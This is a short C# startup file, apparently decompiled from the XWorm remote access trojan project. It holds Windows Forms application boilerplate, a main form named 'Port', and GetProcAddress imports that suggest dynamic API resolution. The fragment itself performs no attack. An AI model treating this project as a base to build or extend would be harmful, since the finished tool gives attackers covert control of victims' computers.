using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;

namespace XWorm.My;

[GeneratedCode("MyTemplate", "11.0.0.0")]
[EditorBrowsable(EditorBrowsableState.Never)]
internal class MyApplication : WindowsFormsApplicationBase
{
	internal delegate int Delegate2(IntPtr intptr_0, IntPtr intptr_1);

	internal delegate int Delegate3(Delegate2 delegate2_0, IntPtr intptr_0);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	[DebuggerHidden]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static void Main(string[] Args)
	{
		try
		{
			Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.UseCompatibleTextRendering);
		}
		finally
		{
		}
		MyProject.Application.Run(Args);
		//Application.Run(new Main());
	}

	[DebuggerStepThrough]
	public MyApplication()
		: base(AuthenticationMode.Windows)
	{
		base.IsSingleInstance = false;
		base.EnableVisualStyles = true;
		base.SaveMySettingsOnExit = true;
		base.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
	}

	[DebuggerStepThrough]
	protected override void OnCreateMainForm()
	{
		base.MainForm = MyProject.Forms.Port;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	internal static extern Delegate3 GetProcAddress(IntPtr hModule, string lpProcName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
	public static extern IntPtr GetProcAddress2(IntPtr hModule, string lpProcName);
}